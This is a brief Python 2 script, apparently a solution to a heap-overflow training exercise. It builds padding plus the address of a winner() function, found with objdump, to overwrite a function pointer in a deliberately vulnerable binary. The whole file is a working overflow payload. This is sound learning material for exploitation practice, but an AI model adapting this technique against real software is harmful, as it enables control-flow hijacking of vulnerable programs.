#!/usr/bin/python

# usage: ./heap `./heap.py`

# we find the address of winner() with objdump
#
# 
# $ objdump -d heap | grep winner
#      00000000004005d4 <winner>:
#      00000000004005e4 <nowinner>:

#
# padding for the d, f and winner address
pad = 'A'*72
test = 'B'*4 + 'C'*4 #+ 'D' * 4
winAddr = '\xd4\x05\x40\x00'

print pad + test + winAddr
